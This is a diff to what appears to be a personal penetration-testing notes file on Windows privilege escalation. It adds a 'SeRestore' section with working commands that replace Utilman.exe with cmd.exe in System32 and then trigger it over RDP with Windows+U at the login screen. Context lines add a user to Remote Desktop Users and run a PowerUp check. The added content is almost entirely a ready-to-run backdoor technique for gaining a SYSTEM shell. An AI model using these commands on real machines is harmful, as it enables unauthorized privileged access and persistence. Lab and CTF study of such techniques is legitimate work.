@@ -153,5 +153,16 @@ net localgroup 'Remote Desktop Users' api /add
 Invoke-AllChecks
 ```
 ---
+# SeRestore
+```powershell
+# C:\Windows\system32
+ren Utilman.exe Utilman.old
+ren cmd.exe Utilman.exe
+```
+```bash
+rdesktop 192.168.81.165
+windows + u
+```
+---
 # priviledge escalation
 - https://github.com/gtworek/Priv2Admin
